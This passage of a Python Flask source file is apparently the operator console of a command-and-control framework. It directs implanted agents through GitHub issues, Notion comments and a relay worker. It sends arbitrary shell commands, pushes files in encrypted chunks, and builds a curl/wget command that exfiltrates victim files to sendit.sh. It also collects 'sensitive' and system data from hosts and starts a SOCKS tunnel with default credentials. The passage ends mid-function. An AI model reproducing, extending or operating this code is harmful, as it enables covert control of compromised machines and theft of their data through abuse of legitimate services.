        db.msg_save(conn, posted_id, cmd_text, True, cmd_id, None, "command")

    _emit("command_sent", {
        "agent_id":     posted_id,
        "sibling_ids":  _sibling_ids_for(posted_id),
        "channel":      posted_ch,
        "command":      cmd_text,
        "command_id":   cmd_id,
        "timestamp":    datetime.now().strftime("%H:%M:%S"),
        "is_file":      is_file,
    })
    return True, cmd_id


def _is_file_cmd(cmd: str) -> bool:
    t = cmd.strip()
    return (t in ("ls", "dir") or
            t.startswith("ls ") or t.startswith("dir ") or
            t.startswith("readfile ") or t.startswith("upload ") or
            t.startswith("upload_chunk "))


# ── API: Agents ───────────────────────────────────────────────────────────────

@app.route("/api/agents")
@login_required
def api_agents():
    if request.args.get("discover") == "1":
        conn = _conn()
        try:
            _discover_agents(conn)
            raw_agents = db.agent_list(conn)
            for a in raw_agents:
                a["note"] = db.note_get(conn, a["id"])
            _annotate_last_reply(raw_agents, conn)
            with _lock:
                _state["agents"] = raw_agents
        except Exception as e:
            debug_log(f"GET /api/agents discover: {e}")
    warnings = []
    if _worker_discovery_blocked():
        warnings.append("worker_discovery_skipped_no_c2_password")
    return jsonify({"agents": _agents_for_ui(_conn()), "warnings": warnings})


@app.route("/api/agents/refresh", methods=["POST"])
@login_required
def api_refresh_agents():
    with _lock:
        gh_token = _pick_token()
        n_token  = _state.get("notion_token", "")

    with _lock:
        w_urls2   = _state.get("worker_urls", "")
        w_secret2 = _state.get("worker_secret", "")
    if not gh_token and not n_token and not (w_urls2 and w_secret2):
        return jsonify({"error": "未配置任何通道（GitHub / Notion / Worker）"}), 400

    conn = _conn()
    _discover_agents(conn)

    # Reload from DB (includes previously known agents not returned this cycle).
    # _state 保持原始分行（后台轮询两条渠道）；UI / SSE 给合流后的视图。
    raw_agents = db.agent_list(conn)
    for a in raw_agents:
        a["note"] = db.note_get(conn, a["id"])
    _annotate_last_reply(raw_agents, conn)
    with _lock:
        _state["agents"] = raw_agents
    ui_agents = _collapse_dual_channel_agents(raw_agents)

    warnings = []
    if _worker_discovery_blocked():
        warnings.append("worker_discovery_skipped_no_c2_password")
    _emit("agents_updated", {"agents": ui_agents})
    return jsonify({"agents": ui_agents, "warnings": warnings})


# ── API: Agent notes ──────────────────────────────────────────────────────────

@app.route("/api/agents/<agent_id>/note", methods=["GET", "POST"])
@login_required
def api_agent_note(agent_id):
    conn = _conn()
    if request.method == "GET":
        return jsonify({"note": _note_get_any(conn, agent_id)})
    note = (request.json or {}).get("note", "")
    _note_set_all(conn, agent_id, note)
    return jsonify({"ok": True})


# ── API: Commands ─────────────────────────────────────────────────────────────

@app.route("/api/command", methods=["POST"])
@login_required
def api_command():
    data     = request.json or {}
    agent_id = data.get("agent_id", "")
    cmd_text = data.get("command",  "").strip()
    if not agent_id or not cmd_text:
        return jsonify({"error": "agent_id and command required"}), 400

    ok, result = _internal_send(agent_id, cmd_text)
    if not ok:
        return jsonify({"error": result}), (404 if "not found" in result.lower() else 500)
    return jsonify({"command_id": result, "command": cmd_text})


# ── API: Messages ─────────────────────────────────────────────────────────────

@app.route("/api/messages/<agent_id>")
@login_required
def api_messages(agent_id):
    conn = _conn()
    # Default: newest 400 only (terminal loads older on demand via ?all=1) —
    # full-history decryption on every click was the slow-terminal root cause.
    full = request.args.get("all") == "1"
    ids = _sibling_ids_for(agent_id)
    msgs = db.msg_list_many(conn, ids, limit=None if full else 400)
    cmd_hist = {}
    with _lock:
        for aid in ids:
            cmd_hist.update(_state["cmd_history"].get(aid, {}))
    return jsonify({"messages": msgs, "command_history": cmd_hist})


@app.route("/api/history/clear", methods=["POST"])
@login_required
def api_clear_history():
    data     = request.json or {}
    agent_id = data.get("agent_id", "")
    ids = _sibling_ids_for(agent_id)
    pool = _all_known_agents()

    with _lock:
        token  = _pick_token()
        for aid in ids:
            _state["cmd_history"].pop(aid, None)
            _state["chunk_buf"].pop(aid, None)

    warnings = []
    for aid in ids:
        agent = next((a for a in pool if str(a.get("id")) == str(aid)), None)
        if not agent:
            continue
        channel = agent.get("channel", "github")
        try:
            if channel == "notion":
                n_token = _state.get("notion_token", "")
                if n_token:
                    NotionClient(n_token, agent["repo"]).clear_comments(aid)
                # Notion API 本来就不能删评论，不进 warnings，免得盖住 Worker/GitHub 真失败
            elif channel == "worker":
                with _lock:
                    wu, wk, wp = (_state.get("worker_urls", ""),
                                  _state.get("worker_secret", ""),
                                  _state.get("worker_path", ""))
                if wu and wk:
                    from worker_api import WorkerClient
                    wc = WorkerClient(wk, wu, wp)
                    _n, supported = wc.purge_comments(aid)
                    if not supported:
                        err = wc._last_error or ""
                        if any(c in err for c in ("404", "405")):
                            warnings.append("Worker 中继过旧，远端评论未清")
                        else:
                            warnings.append("Worker 远端清理失败，D1 旧评论可能还在")
            elif token:
                GitHubClient(token, agent.get("repo") or "").clear_comments(aid)
        except Exception as e:
            debug_log(f"api_clear_history: clear_comments failed agent={aid}: {e}")
            warnings.append(f"{aid} 远端清理失败")
        db.msg_clear(_conn(), aid)
    _audit("history_clear", agent_id, detail=f"siblings={ids}")
    # 去重保序
    seen_w, uniq = set(), []
    for w in warnings:
        if w not in seen_w:
            seen_w.add(w)
            uniq.append(w)
    return jsonify({"ok": True, "cleared": ids, "warnings": uniq})


# ── API: Scan (fixed — constructs proper command) ─────────────────────────────

# ── API: Files ────────────────────────────────────────────────────────────────

@app.route("/api/files/<agent_id>")
@login_required
def api_files(agent_id):
    path    = request.args.get("path", "/")
    conn    = _conn()
    entries = _fl_get_any(conn, agent_id, path)
    return jsonify({"path": path, "entries": entries})


@app.route("/api/files/upload", methods=["POST"])
@login_required
def api_upload():
    agent_id  = request.form.get("agent_id", "")
    dest_path = (request.form.get("dest_path") or request.form.get("dest_dir") or "/tmp").rstrip("/")
    f         = request.files.get("file")
    if not f or not agent_id:
        return jsonify({"error": "Missing file or agent_id"}), 400

    # 30 KB per chunk: the chunk travels inside an AES-GCM-encrypted command
    # comment, and base64 expansion (×4/3) must keep the whole comment under
    # GitHub's 65,536-char limit (400 KB produced ~711k-char comments — every
    # upload over ~36 KB failed with 422 on the GitHub channel). 30 KB is also
    # safe for Notion (100 × 2000-char rich_text blocks per comment).
    CHUNK      = 30_000
    MAX_UPLOAD = 50 * 1024 * 1024  # 50 MB hard limit to prevent OOM
    data    = f.read(MAX_UPLOAD + 1)
    if len(data) > MAX_UPLOAD:
        return jsonify({"error": f"File too large (max {MAX_UPLOAD // 1024 // 1024} MB)"}), 413
    fname   = f.filename or "upload"
    total   = max(1, (len(data) + CHUNK - 1) // CHUNK)
    tid     = uuid.uuid4().hex[:16]
    dest    = f"{dest_path}/{fname}"

    for i in range(total):
        chunk = data[i * CHUNK: (i + 1) * CHUNK]
        payload = json.dumps({
            "transfer_id":  tid,
            "path":         dest,
            "chunk_index":  i,
            "total_chunks": total,
            "data":         base64.b64encode(chunk).decode(),
        })
        ok, _ = _internal_send(agent_id, f"upload_chunk {payload}")
        if not ok:
            return jsonify({"error": "Send failed at chunk " + str(i)}), 500
        if total > 1:
            time.sleep(0.3)

    _audit("file_to_agent", agent_id, f"{fname} → {dest} ({total} chunks)")
    return jsonify({"ok": True, "transfer_id": tid, "total": total, "filename": fname})


# ── API: sendit.sh upload → background download ───────────────────────────────

@app.route("/api/files/sendit", methods=["POST"])
@login_required
def api_files_sendit():
    data     = request.json or {}
    agent_id = data.get("agent_id", "")
    filepath = data.get("filepath", "").strip()
    # operator-supplied name must stay INSIDE the downloads dir — basename it
    filename = _safe_fname(data.get("filename") or filepath)

    if not agent_id or not filepath:
        return jsonify({"error": "agent_id and filepath required"}), 400

    agent = _agent_row(agent_id)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404

    # Escape single quotes in path to prevent shell injection when embedding in '...'
    safe_filepath = filepath.replace("'", "'\\''")
    safe_filename = filename.replace("'", "_")

    cmd = (
        f"(curl -sf 'https://sendit.sh/{safe_filename}' --data-binary @'{safe_filepath}' 2>/dev/null"
        f" || wget -qO- --post-file='{safe_filepath}' 'https://sendit.sh/{safe_filename}' 2>/dev/null)"
    )

    ok, cmd_id = _internal_send(agent_id, cmd)
    if not ok:
        return jsonify({"error": cmd_id}), 500

    # Register pending (memory + DB): agent reply after a restart still downloads.
    _sendit_register(cmd_id, safe_filename, agent)

    return jsonify({"ok": True, "command_id": cmd_id, "filename": filename})


# ── API: SysInfo ──────────────────────────────────────────────────────────────

@app.route("/api/sysinfo/<agent_id>")
@login_required
def api_sysinfo(agent_id):
    conn = _conn()
    return jsonify({"latest": _si_latest_any(conn, agent_id),
                    "history": _si_history_any(conn, agent_id)})


@app.route("/api/sysinfo/<agent_id>/<int:sid>")
@login_required
def api_sysinfo_snapshot(agent_id, sid):
    return jsonify({"content": _si_by_id_any(_conn(), agent_id, sid)})


# ── API: Sensitive ────────────────────────────────────────────────────────────

@app.route("/api/sensitive/<agent_id>")
@login_required
def api_sensitive(agent_id):
    conn = _conn()
    return jsonify({"latest": _sen_latest_any(conn, agent_id),
                    "history": _sen_history_any(conn, agent_id)})


@app.route("/api/sensitive/<agent_id>/<int:sid>")
@login_required
def api_sensitive_snapshot(agent_id, sid):
    return jsonify({"content": _sen_by_id_any(_conn(), agent_id, sid)})


# ── API: Settings ─────────────────────────────────────────────────────────────

@app.route("/api/settings", methods=["GET", "POST"])
@login_required
def api_settings():
    if request.method == "GET":
        with _lock:
            raw_tok = _state.get("github_token") or ""
            tok_parts = [t.strip() for t in raw_tok.split(",") if t.strip()]
            ntok = _state.get("notion_token") or ""
            return jsonify({
                "github_token_set":  bool(tok_parts) or bool(_pick_token()),
                "github_token_count": len(tok_parts),
                "github_token_hints": _token_hints(raw_tok),
                "github_token_from_builder": bool(not tok_parts and _pick_token()),
                "github_repos":      _state["github_repos"],
                "github_repos_from_builder": bool(
                    (db.cfg_get(_conn(), "builder_github_repo") or "").strip()
                    and (db.cfg_get(_conn(), "builder_github_repo") or "").strip()
                    not in (_state.get("github_repos") or [])),
                "password_set":      bool((_state.get("password") or "").strip()),
                "poll_interval":     _state["poll_interval"],
                "issue_limit":       _state["issue_limit"],
                "stale_days":        _state["stale_days"],
                "tunnel_ip":         _state["tunnel_ip"],
                "tunnel_port":       _state["tunnel_port"],
                "tunnel_secret_set": bool((_state.get("tunnel_secret") or "").strip()),
                "web_password_set":  bool(_state.get("web_password")),
                "web_username":      _state["web_username"],
                "notion_token_set":  bool(ntok.strip()),
                "worker_urls":       _state.get("worker_urls", ""),
                "worker_path":       _state.get("worker_path", ""),
                "worker_secret_set": bool((_state.get("worker_secret") or "").strip()),
                "notion_databases":  _state.get("notion_databases", []),
                "wspty_host":        _state.get("wspty_host", ""),
                "wspty_port":        _state.get("wspty_port", "7337"),
                "upgrade_url":       _state.get("upgrade_url", ""),
                "upgrade_dest":      _state.get("upgrade_dest", "/tmp/.agent_upg"),
                "upgrade_manual_path": _state.get("upgrade_manual_path", ""),
                "always_poll":       os.environ.get("C2_ALWAYS_POLL") == "1",
                "worker_discovery_blocked": bool(
                    (_state.get("worker_urls") or "").strip()
                    and (_state.get("worker_secret") or "").strip()
                    and not (_state.get("password") or "").strip()),
            })

    data = request.json or {}
    pw_changed = None
    web_pw_changed = None
    web_user_changed = None
    with _lock:
        for k in ("tunnel_ip", "wspty_host", "wspty_port",
                  "upgrade_url", "upgrade_dest", "upgrade_manual_path"):
            if k in data:
                val = str(data[k]).strip() if data[k] is not None else ""
                if val == "-":
                    _state[k] = ""
                elif val:
                    _state[k] = val
        if "github_token" in data:
            val = str(data["github_token"]).strip() if data["github_token"] is not None else ""
            if val == "-":
                _state["github_token"] = ""
            elif val:
                _state["github_token"] = val
        elif "github_token_keep_indices" in data or "github_token_add" in data \
                or "github_token_keep_hints" in data:
            if "github_token_keep_indices" in data:
                _state["github_token"] = _apply_token_keep_indices(
                    _state.get("github_token", ""),
                    data.get("github_token_keep_indices"),
                    data.get("github_token_add"),
                )
            else:
                _state["github_token"] = _apply_token_keep_add(
                    _state.get("github_token", ""),
                    data.get("github_token_keep_hints"),
                    data.get("github_token_add"),
                )
        if "notion_token" in data:
            val = str(data["notion_token"]).strip() if data["notion_token"] is not None else ""
            if val == "-":
                _state["notion_token"] = ""
            elif val:
                _state["notion_token"] = val
        if "password" in data:
            val = str(data["password"]).strip() if data["password"] is not None else ""
            if val == "-":
                _state["password"] = ""
                pw_changed = ""
            elif val:
                _state["password"] = val
                pw_changed = val
        if "github_repos" in data:
            _state["github_repos"] = [r.strip() for r in data["github_repos"] if r.strip()]
        if "notion_databases" in data:
            _state["notion_databases"] = [d.strip() for d in data["notion_databases"] if d.strip()]
        if "poll_interval" in data:
            try:
                _state["poll_interval"] = max(10, int(data["poll_interval"]))
            except ValueError:
                pass
        if "stale_days" in data:
            try:
                _state["stale_days"] = max(1, int(data["stale_days"]))
            except ValueError:
                pass
        if "issue_limit" in data:
            try:
                n = int(data["issue_limit"])
                # 0 = 关闭自动清理；>0 时下限 10，避免裁到水位附近的未处理命令
                _state["issue_limit"] = 0 if n <= 0 else max(10, n)
            except ValueError:
                pass
        # Worker 三件套：请求里缺字段或空串都不覆盖已有值（防 Settings 回填失败把一键部署抹掉）
        for k in ("worker_urls", "worker_secret", "worker_path", "tunnel_secret"):
            if k in data:
                val = str(data[k]).strip() if data[k] is not None else ""
                if val == "-":
                    _state[k] = ""
                elif val:
                    _state[k] = val
        if "tunnel_port" in data and str(data.get("tunnel_port") or "").strip():
            _state["tunnel_port"] = str(data["tunnel_port"]).strip()
            _state["stowaway_listen"] = _state["tunnel_port"]
        if data.get("web_password"):
            _state["web_password"] = data["web_password"]
            web_pw_changed = data["web_password"]
        if data.get("web_username"):
            _state["web_username"] = data["web_username"]
            web_user_changed = data["web_username"]

    _save_config()
    if pw_changed is not None:
        _sync_builder_password(_conn(), pw_changed)
    if web_pw_changed:
        _sync_runtime_env_key("WEB_PASSWORD", web_pw_changed)
    if web_user_changed:
        _sync_runtime_env_key("WEB_USERNAME", web_user_changed)
    # Settings 改 Worker 三件套时同步编包键，避免「面板能连、新包仍打旧中继」。
    if any(k in data for k in ("worker_urls", "worker_secret", "worker_path")):
        conn_s = _conn()
        with _lock:
            wu = (_state.get("worker_urls") or "").strip()
            ws = (_state.get("worker_secret") or "").strip()
            wp = (_state.get("worker_path") or "").strip()
        if wu:
            db.cfg_set(conn_s, "builder_worker_urls", wu)
        if ws:
            db.cfg_set(conn_s, "builder_worker_secret", ws)
        if wp:
            db.cfg_set(conn_s, "builder_worker_path", wp)
    return jsonify({"ok": True})


def _runtime_env_path() -> str:
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                        ".runtime.env")


def build_console_backup(zpath: str) -> dict:
    """Pack the console DB, Library downloads, and .runtime.env into zpath.

    The archive contains secrets (tokens, decrypt password, web login).
    """
    created = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    files = []
    skipped = []
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as zf:
        tmpdb = zpath + ".sqlite"
        try:
            src = sqlite3.connect(db.DB_PATH)
            dst = sqlite3.connect(tmpdb)
            try:
                src.backup(dst)
            finally:
                dst.close()
                src.close()
            zf.write(tmpdb, "c2_web.db")
            files.append("c2_web.db")
        except Exception as e:
            skipped.append(f"c2_web.db ({e})")
        finally:
            try:
                os.remove(tmpdb)
            except OSError:
                pass

        if os.path.isdir(DOWNLOADS_DIR):
            for root, dirs, names in os.walk(DOWNLOADS_DIR):
                dirs[:] = [d for d in dirs if d not in ("__pycache__",)]
                for name in names:
                    full = os.path.join(root, name)
                    rel = os.path.relpath(full, DOWNLOADS_DIR).replace(os.sep, "/")
                    arc = f"downloads/{rel}"
                    try:
                        zf.write(full, arc)
                        files.append(arc)
                    except OSError as e:
                        skipped.append(f"{arc} ({e})")

        envp = _runtime_env_path()
        if os.path.isfile(envp):
            try:
                zf.write(envp, "runtime.env")
                files.append("runtime.env")
            except OSError as e:
                skipped.append(f"runtime.env ({e})")

        readme = (
            "GitHub C2 console backup\n"
            f"created_utc: {created}\n\n"
            "Contents:\n"
            "- c2_web.db     SQLite: agents, notes, messages, settings, builder, audit\n"
            "- downloads/    Library notes and files (per agent)\n"
            "- runtime.env   deploy-time web login / channel secret (if present)\n\n"
            "THIS ZIP CONTAINS SECRETS. Keep it offline. Do not commit it.\n"
        )
        if skipped:
            readme += "\nSkipped:\n- " + "\n- ".join(skipped) + "\n"
        zf.writestr("README.txt", readme)
        files.append("README.txt")
    return {"created": created, "files": files, "skipped": skipped}


@app.route("/api/backup")
@login_required
def api_backup():
    fd, zpath = tempfile.mkstemp(prefix="c2-backup-", suffix=".zip")
    os.close(fd)
    try:
        build_console_backup(zpath)
    except Exception as e:
        try:
            os.remove(zpath)
        except OSError:
            pass
        return jsonify({"error": f"backup failed: {e}"}), 500

    name = datetime.now(timezone.utc).strftime("c2-backup-%Y%m%d-%H%M%S.zip")

    @after_this_request
    def _cleanup(resp):
        try:
            os.remove(zpath)
        except OSError:
            pass
        return resp

    return send_file(
        zpath,
        as_attachment=True,
        download_name=name,
        mimetype="application/zip",
    )


@app.route("/api/audit")
@login_required
def api_audit():
    """Operator audit trail (newest first)."""
    limit = _safe_int(request.args.get("limit"), 200)
    return jsonify({"entries": db.audit_list(_conn(), limit)})


@app.route("/api/stats")
@login_required
def api_stats():
    """KPI counters for the dashboard header (same-origin fetch only)."""
    conn = _conn()
    stats = db.stats_snapshot(conn)

    # Online/idle/offline: same last_reply helper as the agent list (memory + DB).
    now = time.time()
    online = idle = 0
    agents = _agents_for_ui(conn, now)
    stats["agents_total"] = len(agents)
    for a in agents:
        last = a.get("last_reply_ts")
        if not last:
            continue
        ago = now - last
        if ago < 300:
            online += 1
        elif ago < 1800:
            idle += 1
    stats["agents_online"]  = online
    stats["agents_idle"]    = idle
    stats["agents_offline"] = max(0, stats["agents_total"] - online - idle)
    stats["online_secs"] = 300
    stats["idle_secs"] = 1800
    return jsonify(stats)


@app.route("/api/killswitch/activate", methods=["POST"])
@login_required
def api_killswitch_activate():
    """Raise KILLALL on every configured channel (GitHub / Worker / Notion)."""
    token = _pick_token()
    repos = _github_repos_effective()
    ok_count = 0
    errors = []
    with _lock:
        w_urls, w_secret, w_path = (_state.get("worker_urls", ""),
                                     _state.get("worker_secret", ""),
                                     _state.get("worker_path", ""))
        n_token = _state.get("notion_token", "")
    if not (token and repos) and not (w_urls and w_secret) and not n_token:
        return jsonify({"error": "未配置任何通道（GitHub / Worker / Notion）"}), 400
    if w_urls and w_secret:
        try:
            if WorkerClient(w_secret, w_urls, w_path).create_kill_signal():
                ok_count += 1
            else:
                errors.append("worker: request failed")
        except Exception as e:
            errors.append(f"worker: {e}")
    if token:
        for repo in repos:
            gh = GitHubClient(token, repo)
            if gh.create_kill_signal():
                ok_count += 1
            else:
                errors.append(f"{repo}: {gh._last_error or 'unknown error'}")
                debug_log(f"killswitch: {repo} failed: {gh._last_error}")
    notion_pages = 0
    if n_token:
        for a in _all_known_agents():
            if a.get("channel") != "notion" or not a.get("id"):
                continue
            notion_pages += 1
            try:
                ok, err = NotionClient(n_token, a.get("repo") or "").post_comment(
                    a["id"], "<!-- k -->KILLALL")
                if ok:
                    ok_count += 1
                else:
                    errors.append(f"notion {a['id']}: {err}")
            except Exception as e:
                errors.append(f"notion {a['id']}: {e}")
        if notion_pages == 0:
            errors.append("notion: 已配 Token 但还没有 Notion agent 页，无法下发 KILLALL 评论")
        elif ok_count:
            db.cfg_set(_conn(), "killswitch_notion_at", str(time.time()))
    _audit("killswitch_activate", detail=f"repos={len(repos)} ok={ok_count}"
            + (f" errors={' | '.join(errors)[:200]}" if errors else ""))
    result = {"ok": ok_count > 0, "count": ok_count}
    if errors:
        result["errors"] = errors
    return jsonify(result)


@app.route("/api/killswitch/deactivate", methods=["POST"])
@login_required
def api_killswitch_deactivate():
    """Close all KILLALL issues — cancel pending kill signal."""
    token = _pick_token()
    repos = _github_repos_effective()
    total = 0
    with _lock:
        w_urls, w_secret, w_path = (_state.get("worker_urls", ""),
                                     _state.get("worker_secret", ""),
                                     _state.get("worker_path", ""))
    if w_urls and w_secret:
        try:
            if WorkerClient(w_secret, w_urls, w_path).deactivate_kill_signal():
                total += 1
        except Exception as e:
            debug_log(f"killswitch deactivate worker: {e}")
    if token:
        for repo in repos:
            total += GitHubClient(token, repo).remove_kill_signal()
    with _lock:
        n_token = _state.get("notion_token", "")
    if n_token:
        total += _notion_kill_cancel()
    if not total:
        return jsonify({"error": "No channel configured"}), 400
    return jsonify({"ok": True, "closed": total})


@app.route("/api/notion/setup_database", methods=["POST"])
@login_required
def api_notion_setup_database():
    """Add missing Properties to existing Notion Databases.
    Does NOT create new databases or modify existing columns/data — only adds missing ones."""
    with _lock:
        n_token = _state.get("notion_token", "")
        n_dbs   = list(_state.get("notion_databases", []))

    if not n_token:
        return jsonify({"error": "Notion token not configured"}), 400
    if not n_dbs:
        return jsonify({"error": "No Notion databases configured"}), 400

    # The Properties the agent expects
    required_props = {
        "Agent ID":  {"rich_text": {}},
        "Hostname":  {"rich_text": {}},
        "Username":  {"rich_text": {}},
        "OS":        {"rich_text": {}},
        "Privilege": {"select": {"options": [
            {"name": "root", "color": "red"},
            {"name": "user", "color": "blue"},
        ]}},
        "Kernel":    {"rich_text": {}},
        "Arch":      {"rich_text": {}},
        "IPs":       {"rich_text": {}},
        "Version":   {"rich_text": {}},
    }

    headers = {
        "Authorization": f"Bearer {n_token}",
        "Notion-Version": "2022-06-28",
        "Content-Type": "application/json",
    }

    results = []
    for db_id in n_dbs:
        try:
            # 1. Get current database schema
            r = _requests.get(
                f"https://api.notion.com/v1/databases/{db_id}",
                headers=headers, timeout=15,
            )
            if not r.ok:
                results.append(f"{db_id[:8]}…: failed to read ({r.status_code})")
                continue

            existing = set(r.json().get("properties", {}).keys())

            # 2. Find missing properties
            missing = {k: v for k, v in required_props.items() if k not in existing}
            if not missing:
                results.append(f"{db_id[:8]}…: all columns present ✓")
                continue

            # 3. PATCH to add only the missing properties
            patch_r = _requests.patch(
                f"https://api.notion.com/v1/databases/{db_id}",
                headers=headers, timeout=15,
                json={"properties": missing},
            )
            if patch_r.ok:
                results.append(f"{db_id[:8]}…: added {', '.join(missing.keys())} ✓")
            else:
                results.append(f"{db_id[:8]}…: patch failed ({patch_r.status_code})")
        except Exception as e:
            results.append(f"{db_id[:8]}…: error ({e})")

    return jsonify({"ok": True, "results": results})


# ── API: Tunnel (all use _internal_send — no test_request_context) ────────────

def _tunnel_start_cmd() -> str:
    """Built-in agent tunnel command (no external binary download needed)."""
    with _lock:
        ip     = _state["tunnel_ip"].strip()
        port   = (_state.get("tunnel_port") or _state.get("stowaway_listen") or "9998").strip()
        secret = _state["tunnel_secret"].strip()
    return f"tunnel {ip}:{port} {secret}"


def _tunnel_stop_cmd() -> str:
    return "tunnel:close"


@app.route("/api/tunnel/config", methods=["POST"])
@login_required
def api_tunnel_config():
    data = request.json or {}
    with _lock:
        if "tunnel_ip" in data:
            _state["tunnel_ip"] = str(data["tunnel_ip"])
        if "tunnel_port" in data and str(data.get("tunnel_port") or "").strip():
            _state["tunnel_port"] = str(data["tunnel_port"]).strip()
            _state["stowaway_listen"] = _state["tunnel_port"]
        if "tunnel_secret" in data:
            val = str(data["tunnel_secret"]).strip()
            if val == "-":
                _state["tunnel_secret"] = ""
            elif val:
                _state["tunnel_secret"] = val
    _save_config()
    return jsonify({"ok": True})


@app.route("/api/tunnel/deploy", methods=["POST"])
@login_required
def api_tunnel_deploy():
    """Deploy = Start (built-in, no download needed)."""
    aid = (request.json or {}).get("agent_id", "")
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    ok, r = _internal_send(aid, _tunnel_start_cmd())
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/tunnel/start", methods=["POST"])
@login_required
def api_tunnel_start():
    aid = (request.json or {}).get("agent_id", "")
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    with _lock:
        ip = _state["tunnel_ip"].strip()
    if not ip:
        return jsonify({"error": "tunnel_ip not configured — set it in Tunnel tab "
                                 "(Relay IP = the controller's reachable address)"}), 400
    ok, r = _internal_send(aid, _tunnel_start_cmd())
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/tunnel/stop", methods=["POST"])
@login_required
def api_tunnel_stop():
    aid = (request.json or {}).get("agent_id", "")
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    ok, r = _internal_send(aid, _tunnel_stop_cmd())
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/tunnel/sweep", methods=["POST"])
@login_required
def api_tunnel_sweep():
    """Sweep = Stop (built-in, no files to clean)."""
    aid = (request.json or {}).get("agent_id", "")
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    ok, r = _internal_send(aid, _tunnel_stop_cmd())
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


# ── API: Stowaway Admin ──────────────────────────────────────────────────────

def _stowaway_running() -> bool:
    """True if the c2-stowaway tmux session is alive AND contains a running process."""
    # Primary: tmux session check (most reliable when tmux is used)
    if _has_tmux():
        try:
            r = _subprocess.run(
                ["tmux", "has-session", "-t", f"={STOWAWAY_TMUX}"],
                capture_output=True, timeout=3,
            )
            if r.returncode == 0:
                # Session exists — verify the stowaway_admin process is actually running
                # by looking for it in ps (tmux session can linger after process exits)
                try:
                    ps = _subprocess.run(
                        ["pgrep", "-f", "stowaway_admin"],
                        capture_output=True, timeout=3,
                    )
                    if ps.returncode == 0 and ps.stdout.strip():
                        return True
                except Exception:
                    # pgrep not available; trust the tmux session check
                    return True
                return False
        except Exception:
            pass
    # Fallback: check PID file (non-tmux mode)
    try:
        with open(STOWAWAY_PID) as f:
            pid = int(f.read().strip())
        os.kill(pid, 0)   # signal 0 = existence check, no actual signal sent
        return True
    except Exception:
        return False


@app.route("/api/tunnel/admin/config", methods=["GET", "POST"])
@login_required
def api_stowaway_config():
    if request.method == "GET":
        with _lock:
            return jsonify({
                "listen":   _state.get("stowaway_listen", "9998"),
                "socks":    _state.get("stowaway_socks",  "1080"),
                "binary":   STOWAWAY_BIN,
                "has_bin":  os.path.isfile(STOWAWAY_BIN),
                "secret_set":  bool((_state.get("tunnel_secret") or "").strip()),
                "secret_hint": _token_hint(_state.get("tunnel_secret") or ""),
                "socks_user":  _state.get("stowaway_socks_user", "s5admin"),
                "socks_pass":  _state.get("stowaway_socks_pass", "123456"),
            })
    data = request.json or {}
    with _lock:
        if "listen" in data: _state["stowaway_listen"] = str(data["listen"]).strip()
        if "socks"  in data: _state["stowaway_socks"]  = str(data["socks"]).strip()
        listen = (_state.get("tunnel_port") or _state.get("stowaway_listen") or "9998").strip()
        socks  = _state.get("stowaway_socks", "1080")
        secret = _state.get("tunnel_secret", "").strip()
        s_user = _state.get("stowaway_socks_user", "s5admin")
        s_pass = _state.get("stowaway_socks_pass", "123456")
    _save_config()
    live = _stowaway_read_args()
    stale = _stowaway_running() and not _stowaway_args_match(
        listen, socks, secret, s_user, s_pass)
    out = {"ok": True, "stale": stale,
           "live_listen": live.get("listen"), "live_socks": live.get("socks")}
    if stale:
        out["message"] = (
            f"已保存。Admin 仍听 :{live.get('listen') or '?'}，"
            "点 Start 才会切到新端口/凭据"
        )
    return jsonify(out)


def _stowaway_write_args(listen, socks, secret, socks_user="", socks_pass=""):
    try:
        with open(STOWAWAY_ARGS, "w", encoding="utf-8") as f:
            json.dump({"listen": str(listen), "socks": str(socks),
                       "secret": secret or "",
                       "socks_user": socks_user or "",
                       "socks_pass": socks_pass or ""}, f)
    except Exception:
        pass


def _stowaway_read_args() -> dict:
    try:
        with open(STOWAWAY_ARGS, encoding="utf-8") as f:
            return json.load(f) or {}
    except Exception:
        return {}


def _stowaway_args_match(listen, socks, secret, socks_user="", socks_pass="") -> bool:
    prev = _stowaway_read_args()
    return (str(prev.get("listen") or "") == str(listen)
            and str(prev.get("socks") or "") == str(socks)
            and (prev.get("secret") or "") == (secret or "")
            and (prev.get("socks_user") or "") == (socks_user or "")
            and (prev.get("socks_pass") or "") == (socks_pass or ""))


def _stowaway_stop_proc() -> bool:
    stopped = False
    if _has_tmux():
        try:
            _subprocess.run(["tmux", "kill-session", "-t", STOWAWAY_TMUX],
                            capture_output=True, timeout=5)
            stopped = True
        except Exception:
            pass
    try:
        with open(STOWAWAY_PID) as f:
            pid = int(f.read().strip())
        os.kill(pid, 15)
        stopped = True
    except Exception:
        pass
    try:
        os.remove(STOWAWAY_PID)
    except Exception:
        pass
    try:
        os.remove(STOWAWAY_ARGS)
    except Exception:
        pass
    return stopped


@app.route("/api/tunnel/admin/start", methods=["POST"])
@login_required
def api_stowaway_start():
    with _lock:
        listen_port = (_state.get("tunnel_port") or _state.get("stowaway_listen") or "9998").strip()
        socks_port  = _state.get("stowaway_socks",  "1080")
        secret      = _state.get("tunnel_secret", "").strip()
    if _stowaway_running():
        with _lock:
            _su = _state.get("stowaway_socks_user", "s5admin")
            _sp = _state.get("stowaway_socks_pass", "123456")
        if _stowaway_args_match(listen_port, socks_port, secret, _su, _sp):
            return jsonify({"ok": True, "message": "Already running"})
        _stowaway_stop_proc()
        time.sleep(0.4)

    if not os.path.isfile(STOWAWAY_BIN):
        return jsonify({"error": f"Binary not found: {STOWAWAY_BIN}"}), 400

    with _lock:
        listen_port = (_state.get("tunnel_port") or _state.get("stowaway_listen") or "9998").strip()
        socks_port  = _state.get("stowaway_socks",  "1080")
        socks_user  = _state.get("stowaway_socks_user", "s5admin")
        socks_pass  = _state.get("stowaway_socks_pass", "123456")
        secret      = _state.get("tunnel_secret", "").strip()

    if not secret:
